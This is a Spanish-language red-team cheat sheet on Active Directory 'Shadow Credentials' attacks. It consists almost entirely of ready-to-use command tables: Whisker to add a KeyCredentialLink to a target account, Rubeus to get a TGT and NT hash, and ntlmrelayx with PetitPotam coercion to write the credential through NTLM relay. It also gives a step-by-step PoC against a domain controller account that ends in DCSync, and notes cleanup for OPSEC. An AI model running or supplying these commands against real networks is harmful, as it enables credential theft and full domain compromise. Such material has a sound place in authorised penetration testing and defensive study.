---
aliases:
  - Whisker
  - Shadow Credentials Relay
tags:
  - technique/privilege-escalation
  - technique/credential-access
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Shadow Credentials]]"
  - "[[NTLM Relay]]"
  - "[[Rubeus]]"
---
# Shadow Credentials - Whisker y Relay

> Variante **on-host Windows** (Whisker + Rubeus) y vía **NTLM Relay** (cuando tenés coerción pero no un write directo).

---

## Whisker (Windows on-host)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `.\Whisker.exe add /target:VICTIM$` | Agrega KCL + imprime el comando Rubeus listo | Desde un shell Windows. |
| `.\Rubeus.exe asktgt /user:VICTIM$ /certificate:BASE64_PFX /password:"PWD" /getcredentials /show` | TGT + NT hash del target | Tras el `add` de Whisker. |
| `.\Whisker.exe list /target:VICTIM$` | Listar KeyCredentialLinks | Recon. |
| `.\Whisker.exe remove /target:VICTIM$ /devicecid:CID` | Cleanup del KCL agregado | OPSEC. |
^shadowcred-whisker

## Vía NTLM Relay

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `sudo ntlmrelayx.py -t ldaps://$DC --shadow-credentials --shadow-target 'VICTIM$'` | Escribe KCL sobre el target vía relay de una auth coerced | No tenés write directo pero sí coerción → [[NTLM Relay]]. |
| `PetitPotam.py -u '' -p '' $ATTACKER $VICTIM` | Coerción que dispara la auth a relayar | En paralelo. |
^shadowcred-relay

### PoC Whisker → Rubeus

```powershell
.\Whisker.exe add /target:DC01$
# Copiar el comando Rubeus que imprime →
.\Rubeus.exe asktgt /user:DC01$ /certificate:MIIxxx... /password:"abc" /getcredentials /show
# → NT hash de DC01$ → DCSync
```

> [!tip] Combo
> Shadow Credentials → [[UnPAC-the-hash]] (ya integrado en `/getcredentials` y `certipy auth`) es el puente cert→hash. Sobre `DC$` o cuenta privilegiada → DCSync.
